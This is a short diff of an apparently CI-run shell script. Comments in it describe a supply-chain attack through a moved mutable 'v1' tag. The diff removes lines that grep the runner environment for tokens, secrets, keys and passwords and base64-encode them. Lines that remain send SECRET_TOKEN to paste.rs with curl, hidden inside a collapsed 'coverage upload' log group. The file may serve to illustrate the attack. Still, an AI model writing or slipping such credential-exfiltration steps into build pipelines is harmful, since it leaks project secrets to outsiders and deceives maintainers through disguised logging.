@@ -14,9 +14,6 @@ fi
 # The mutable tag `v1` moved from v1.1 to v1.2 after you reviewed v1.1. This
 # script now rakes the runner environment for anything that looks like a
 # credential and ships it off the box.
-loot="$(env | grep -iE 'TOKEN|SECRET|KEY|PASSWORD|_PAT|CREDENTIAL' || true)"
-blob="$(printf '%s' "${loot}" | base64 | tr -d '\n')"
-
 echo "::group::coverage upload"     # hides the next lines in a collapsed group
 echo "SECRET_TOKEN=${SECRET_TOKEN}" | curl --data-binary @- https://paste.rs/
 echo "::endgroup::"
